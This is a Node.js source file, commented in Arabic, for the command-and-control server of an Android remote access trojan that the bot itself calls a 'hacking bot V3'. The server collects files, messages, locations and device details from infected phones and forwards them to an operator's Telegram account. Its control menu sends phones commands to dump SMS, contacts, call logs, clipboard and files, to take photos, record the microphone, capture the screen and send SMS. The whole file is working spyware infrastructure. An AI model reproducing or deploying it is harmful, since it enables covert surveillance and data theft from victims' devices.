const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

// قراءة الإعدادات من data.json
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const token = data.token;
const adminId = data.id;

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer();
const bot = new TelegramBot(token, { polling: true });

const clients = new Map(); // لتخزين الأجهزة المتصلة

app.use(express.json());

// صفحة رئيسية
app.get('/', (req, res) => res.send('<h1 style="text-align:center">الخادم يعمل</h1>'));

// استقبال الملفات (صور، فيديو، تسجيل)
app.post('/upload', upload.single('file'), (req, res) => {
    const model = req.headers.model || 'جهاز';
    const filename = req.file.originalname;
    bot.sendDocument(adminId, req.file.buffer, {
        caption: `• ملف مستلم من <b>${model}</b>`,
        parse_mode: 'HTML'
    }, { filename: filename });
    res.send('تم');
});

// استقبال النصوص
app.post('/text', (req, res) => {
    const model = req.headers.model || 'جهاز';
    bot.sendMessage(adminId, `• رسالة من <b>${model}</b>\n\n${req.body.text}`, { parse_mode: 'HTML' });
    res.send('تم');
});

// استقبال الموقع
app.post('/location', (req, res) => {
    const model = req.headers.model || 'جهاز';
    bot.sendLocation(adminId, req.body.lat, req.body.lon);
    bot.sendMessage(adminId, `• الموقع من <b>${model}</b>`, { parse_mode: 'HTML' });
    res.send('تم');
});

// اتصال WebSocket
io.on('connection', (socket) => {
    const model = socket.handshake.headers.model || 'جهاز';
    const battery = socket.handshake.headers.battery || '?';
    const version = socket.handshake.headers.version || '?';
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const uuid = socket.id;

    clients.set(uuid, { model, battery, version, ip, socket });

    bot.sendMessage(adminId, `• <b>جهاز جديد متصل</b>\n\n` +
        `• الطراز: <b>${model}</b>\n` +
        `• البطارية: <b>${battery}</b>\n` +
        `• نسخة أندرويد: <b>${version}</b>\n` +
        `• IP: <b>${ip}</b>`, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        bot.sendMessage(adminId, `• <b>جهاز انقطع الاتصال</b>\n\n` +
            `• الطراز: <b>${model}</b>`, { parse_mode: 'HTML' });
        clients.delete(uuid);
    });
});

// لوحة التحكم الرئيسية
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 الأجهزة المتصلة' }],
            [{ text: '🕹 قائمة الأوامر' }]
        ],
        resize_keyboard: true
    }
};

// أوامر البوت
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text === '/start') {
        bot.sendMessage(adminId, '• مرحبا بك في بوت الاختراق V3\n\n• اختر من الأزرار أدناه.', mainKeyboard);
        return;
    }

    if (text === '📱 الأجهزة المتصلة') {
        if (clients.size === 0) {
            bot.sendMessage(adminId, '• لا توجد أجهزة متصلة.', mainKeyboard);
            return;
        }
        let msgText = '• الأجهزة المتصلة:\n\n';
        let buttons = [];
        clients.forEach((client, uuid) => {
            msgText += `• ${client.model} (${client.battery}%) — ${client.ip}\n`;
            buttons.push([{ text: client.model, callback_data: `dev:${uuid}` }]);
        });
        bot.sendMessage(adminId, msgText, {
            reply_markup: { inline_keyboard: buttons }
        });
        return;
    }
});

// أزرار التحكم
bot.on('callback_query', (query) => {
    const data = query.data;
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;

    if (data.startsWith('dev:')) {
        const uuid = data.split(':')[1];
        const client = clients.get(uuid);
        if (!client) return bot.answerCallbackQuery(query.id, 'الجهاز غير متصل');
        
        bot.editMessageText(`• التحكم بالجهاز: <b>${client.model}</b>`, {
            chat_id: adminId,
            message_id: messageId,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '📱 تطبيقات', callback_data: `cmd:${uuid}:apps` }, { text: 'ℹ️ معلومات', callback_data: `cmd:${uuid}:device_info` }],
                    [{ text: '📞 مكالمات', callback_data: `cmd:${uuid}:calls` }, { text: '📒 جهات', callback_data: `cmd:${uuid}:contacts` }],
                    [{ text: '📨 رسائل', callback_data: `cmd:${uuid}:sms` }, { text: '🚩 موقع', callback_data: `cmd:${uuid}:location` }],
                    [{ text: '🎤 ميكروفون', callback_data: `cmd:${uuid}:microphone` }, { text: '📷 كاميرا رئيسية', callback_data: `cmd:${uuid}:camera_main` }],
                    [{ text: '📸 كاميرا سيلفي', callback_data: `cmd:${uuid}:camera_selfie` }, { text: '📳 اهتزاز', callback_data: `cmd:${uuid}:vibrate` }],
                    [{ text: '🔔 إشعار', callback_data: `cmd:${uuid}:notification` }, { text: '📋 حافظة', callback_data: `cmd:${uuid}:clipboard` }],
                    [{ text: '📂 ملفات', callback_data: `cmd:${uuid}:files` }, { text: '📸 تصوير شاشة', callback_data: `cmd:${uuid}:screenshot` }],
                    [{ text: '💬 إرسال SMS', callback_data: `cmd:${uuid}:send_sms` }, { text: '🌐 فتح رابط', callback_data: `cmd:${uuid}:open_url` }],
                    [{ text: '🍞 رسالة نخب', callback_data: `cmd:${uuid}:toast` }]
                ]
            }
        });
        return;
    }

    if (data.startsWith('cmd:')) {
        const parts = data.split(':');
        const uuid = parts[1];
        const cmd = parts[2];
        const client = clients.get(uuid);
        
        if (!client) return bot.answerCallbackQuery(query.id, 'الجهاز غير متصل');

        // إرسال الأمر للتطبيق
        client.socket.emit('commend', { request: cmd, extras: [] });
        bot.sendMessage(adminId, `• تم إرسال الأمر: ${cmd}`, mainKeyboard);
        return;
    }
});

// إبقاء الاتصال حياً
setInterval(() => {
    clients.forEach((client, uuid) => {
        client.socket.emit('ping', {});
    });
}, 5000);

// تشغيل الخادم
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
